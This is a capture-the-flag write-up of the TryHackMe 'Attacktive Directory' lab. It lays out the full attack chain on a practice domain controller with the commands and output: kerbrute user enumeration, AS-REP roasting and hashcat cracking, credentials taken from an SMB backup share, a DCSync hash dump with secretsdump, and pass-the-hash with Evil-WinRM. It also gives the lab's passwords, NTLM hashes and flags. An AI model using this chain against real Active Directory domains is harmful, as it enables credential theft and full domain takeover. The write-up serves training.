---
name: "Attacktive Directory"
platform: THM
category: AD
os: Windows
difficulty: Medium
points: 100
ip: 10.10.x.x
date: "2026-04-24"
tools:
  - Nmap
  - Enum4Linux
  - Kerbrute
  - Impacket
  - Hashcat
  - Evil-WinRM
userFlag: "TryHackMe{K3rb3r0s_Pr3_4uth}"
rootFlag: "TryHackMe{4ctiveD1rectoryM4st3r}"
tags:
  - active-directory
  - kerberos
  - as-rep-roasting
  - pass-the-hash
  - dcsync
  - smb
description: "Exploit an Active Directory Domain Controller. Enumerate valid users via Kerberos, AS-REP roast a service account, pivot through SMB to obtain backup credentials, DCSync the domain, and Pass-The-Hash for full domain compromise."
---

## Reconnaissance

**The Goal:** Identify what services the target is running to determine its role in the network.

We start with an `nmap` scan to see open ports. For a domain controller, we are specifically looking for DNS (53), Kerberos (88), RPC (135), SMB (139/445), and LDAP (389/3268).

```bash
nmap -sC -sV -Pn $IP
```

```plaintext
Starting Nmap 7.93 ( https://nmap.org )
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP
                              (Domain: spookysec.local, Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP
3389/tcp open  ms-wbt-server Microsoft Terminal Services
Service Info: Host: SPOOKYSEC-DC; OS: Windows
```

### Key Observations

- **Port 88 (Kerberos):** Tells us this machine handles authentication for the domain — this is a Domain Controller.
- **Port 389 (LDAP):** Confirms Active Directory. LDAP is the directory that stores all users, groups, and permissions.
- **Port 445 (SMB):** Allows us to potentially query for information or access shared files.

The scan reveals the domain name `spookysec.local` and the machine name `spookysec-dc`. We must add this to our `/etc/hosts` file because Active Directory relies heavily on DNS name resolution.

```bash
echo "$IP spookysec.local spookysec-dc" | sudo tee -a /etc/hosts
```

## Enumeration

**The Goal:** Extract valid usernames from the Domain Controller. We cannot attack accounts if we don't know who exists.

Since anonymous SMB connections fail to leak a full user list, we pivot to attacking Kerberos directly using `kerbrute` with a provided wordlist.

```bash
kerbrute userenum --dc spookysec.local -d spookysec.local userlist.txt
```

```plaintext
    __             __               __
   / /_____  _____/ /_  _______  __/ /____
  / //_/ _ \/ ___/ __ \/ ___/ / / / __/ _ \
 / ,< /  __/ /  / /_/ / /  / /_/ / /_/  __/
/_/|_|\___/_/  /_.___/_/   \__,_/\__/\___/

Version: v1.0.3 (9dad6e1) - Ronnie Flathers @ropnop

2026/04/24 12:05:00 >  [+] VALID USERNAME:  backup@spookysec.local
2026/04/24 12:05:01 >  [+] VALID USERNAME:  administrator@spookysec.local
2026/04/24 12:05:05 >  [+] VALID USERNAME:  svc-admin@spookysec.local
2026/04/24 12:05:09 >  [+] VALID USERNAME:  james@spookysec.local
2026/04/24 12:05:11 >  [+] VALID USERNAME:  robin@spookysec.local
2026/04/24 12:05:11 >  [+] VALID USERNAME:  darkstar@spookysec.local
```

### How Kerbrute Works

Kerberos (Port 88) handles authentication. When you send a request to verify a user, Kerberos responds with different error codes depending on whether the user exists or not. `kerbrute` rapidly sends these pre-authentication requests to brute-force valid usernames without triggering account lockouts — it never actually attempts a password.

We save the discovered users into `valid_users.txt` for the next phase.

## Foothold

**The Goal:** Obtain a password hash for one of the discovered users.

### AS-REP Roasting

We check if any discovered users have an insecure Active Directory setting enabled: **"Do not require Kerberos preauthentication"**. This is known as AS-REP Roasting.

```bash
impacket-GetNPUsers spookysec.local/ -no-pass -usersfile valid_users.txt -format hashcat
```

```plaintext
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] User backup doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User administrator doesn't have UF_DONT_REQUIRE_PREAUTH set
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:fcc8...3d92
[-] User james doesn't have UF_DONT_REQUIRE_PREAUTH set
[-] User robin doesn't have UF_DONT_REQUIRE_PREAUTH set
```

The `svc-admin` account is vulnerable. Normally, Kerberos requires a user to encrypt a timestamp with their password hash to prove their identity before the Domain Controller issues a Ticket Granting Ticket (TGT). However, when "Pre-Auth is not required" is enabled, the DC will hand us data encrypted with that user's password hash simply because we asked. We can take this offline and crack it.

### Cracking the Hash

We save the hash to `hash.txt` and use `hashcat` with `rockyou.txt`:

```bash
hashcat -m 18200 hash.txt /usr/share/wordlists/rockyou.txt
```

```plaintext
$krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:fcc8...3d92:management2005

Session..........: hashcat
Status...........: Cracked
Hash.Mode........: 18200 (Kerberos 5, etype 23, AS-REP)
Hash.Target......: $krb5asrep$23$svc-admin@SPOOKYSEC.LOCAL:fcc8...
```

Password recovered: `svc-admin` : `management2005`

## Privilege Escalation

**The Goal:** Elevate from a standard service account to Domain Administrator.

### SMB Enumeration with Credentials

Now that we have valid credentials, we enumerate what file shares `svc-admin` can access:

```bash
smbclient -L \\\\spookysec.local\\ -U svc-admin
```

```plaintext
Password for [WORKGROUP\svc-admin]: management2005

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        backup          Disk
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share
        SYSVOL          Disk      Logon server share
```

Service accounts often have access to hidden or administrative file shares. The non-standard `backup` share is immediately interesting. We connect and investigate:

```bash
smbclient \\\\spookysec.local\\backup -U svc-admin
```

```plaintext
smb: \> ls
  .                                   D        0  Sat Apr 04 14:08:39 2020
  ..                                  D        0  Sat Apr 04 14:08:39 2020
  backup_credentials.txt              A       48  Sat Apr 04 14:08:53 2020

smb: \> get backup_credentials.txt
```

### Decoding Backup Credentials

The contents of `backup_credentials.txt` are base64 encoded:

```plaintext
YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw
```

```bash
echo "YmFja3VwQHNwb29reXNlYy5sb2NhbDpiYWNrdXAyNTE3ODYw" | base64 -d
```

```plaintext
backup@spookysec.local:backup2517860
```

We now have the `backup` user's password: `backup2517860`.

### DCSync Attack

The `backup` user belongs to the **"Backup Operators"** group. This group has `SeBackupPrivilege`, which is intended to allow full system backups — including the domain's password database (`NTDS.dit`). We abuse this with Impacket's `secretsdump.py` to perform a **DCSync** attack:

```bash
impacket-secretsdump backup:backup2517860@spookysec.local
```

```plaintext
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[-] Extracting NTDS.dit password hashes...
Administrator:500:aad3b435b51404eeaad3b435b51404ee:0e0363213e37b94221497260b0bcb4fc:::
Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
krbtgt:502:aad3b435b51404eeaad3b435b51404ee:0e28155986915152a1215b2446738cce:::
spookysec.local\backup:1141:aad3b435b51404eeaad3b435b51404ee:1fc31b26ae3edc4b184a20b0bd324b10:::
spookysec.local\svc-admin:1142:aad3b435b51404eeaad3b435b51404ee:fcab13b6cbba022a16d56d773f324fc2:::
```

`secretsdump.py` uses the **DCSync** technique — it acts as a rogue Domain Controller and asks the primary DC to replicate (sync) all password hashes for every user in the domain. We have the Administrator NTLM hash: `0e0363213e37b94221497260b0bcb4fc`.

## Root

**The Goal:** Authenticate to the Domain Controller as Administrator.

### Pass-The-Hash via Evil-WinRM

We don't need to crack the Administrator's hash. Windows authentication protocols (NTLM) don't send plaintext passwords over the network — they send the hash. If we already have the hash, we can inject it directly into the authentication process. This is called **Pass-The-Hash**.

```bash
evil-winrm -i $IP -u Administrator -H 0e0363213e37b94221497260b0bcb4fc
```

```plaintext
Evil-WinRM shell v3.4

Info: Establishing connection to remote endpoint

*Evil-WinRM* PS C:\Users\Administrator\Documents> whoami
spookysec\administrator

*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\svc-admin\Desktop\user.txt
TryHackMe{K3rb3r0s_Pr3_4uth}

*Evil-WinRM* PS C:\Users\Administrator\Documents> type C:\Users\Administrator\Desktop\root.txt
TryHackMe{4ctiveD1rectoryM4st3r}
```

**System Compromised.** Full domain takeover achieved through an AS-REP Roast → credential pivot → DCSync → Pass-The-Hash attack chain.
